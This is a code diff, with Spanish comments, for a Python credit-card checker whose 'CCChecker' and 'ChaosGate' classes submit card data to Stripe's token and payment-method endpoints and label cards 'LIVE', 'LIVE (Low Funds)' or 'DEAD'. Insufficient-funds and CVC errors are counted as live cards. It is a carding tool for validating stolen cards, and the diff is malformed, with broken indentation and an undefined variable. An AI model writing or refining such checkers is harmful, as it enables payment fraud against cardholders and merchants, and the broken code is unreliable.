@@ -32,12 +32,17 @@ class CCChecker:
         try:
             r = requests.post('https://api.stripe.com/v1/tokens', data=payload, timeout=15)
             res = r.json()
-            # Retornamos el status y la respuesta cruda para el RiskAnalyzer
-            if "id" in res:
-                return {"status": "LIVE ✅", "msg": "Token Created", "raw": res}
-            return {"status": "DEAD ❌", "msg": res.get('error', {}).get('message', 'Declined'), "raw": res}
-        except:
-            return {"status": "ERROR ⚠️", "msg": "Timeout", "raw": {}}
+            # SUSTITUYE DESDE LA LÍNEA 37 HASTA LA 39 CON ESTO:
+        if "id" in res:
+            # Filtro Real: Solo si pasó el CVC o se creó el token correctamente
+            return {"status": "LIVE ✅", "msg": "Token Created", "raw": res}
+        
+        err_msg = res.get('error', {}).get('message', 'Declined')
+        # Si el banco dice que no tiene fondos, ¡Sigue siendo LIVE!
+        if "insufficient_funds" in err_msg.lower():
+            return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
+            
+        return {"status": "DEAD ❌", "msg": err_msg, "raw": res}
 
 class ChaosGate:
     @staticmethod
@@ -51,17 +56,21 @@ class ChaosGate:
         }
         
         try:
-            # Chaos usa Payment Methods por ser más profundo
-            r = requests.post('https://api.stripe.com/v1/payment_methods', data=payload, headers=headers, timeout=15)
-            res = r.json()
             
-            if "id" in res:
-                return {"status": "LIVE ✅", "msg": "Chaos Success", "raw": res}
+        # Analizamos la respuesta profunda de Chaos Auth V2
+        res_text = str(res).lower()
+        
+        if '"status": "succeeded"' in res_text or 'cvc_check": "pass"' in res_text:
+            return {"status": "LIVE ✅", "msg": "Chaos Success", "raw": res}
             
-            err_msg = res.get('error', {}).get('message', '')
-            if any(x in err_msg.lower() for x in ["funds", "cvc", "authentication"]):
-                return {"status": "LIVE ✅", "msg": f"Chaos: {err_msg}", "raw": res}
-                
-            return {"status": "DEAD ❌", "msg": err_msg, "raw": res}
-        except:
-            return {"status": "ERROR ⚠️", "msg": "Chaos Timeout", "raw": {}}
+        elif "insufficient_funds" in res_text:
+            return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
+            
+        elif any(x in res_text for x in ["funds", "cvc", "authentication_required"]):
+            # Estos casos son tarjetas reales que el banco reconoce
+            return {"status": "LIVE ✅", "msg": "Approved (Squeezer)", "raw": res}
+            
+        else:
+            # Todo lo demás es DEAD real
+            err_raw = res.get('error', {}).get('message', 'Declined')
+            return {"status": "DEAD ❌", "msg": err_raw, "raw": res}
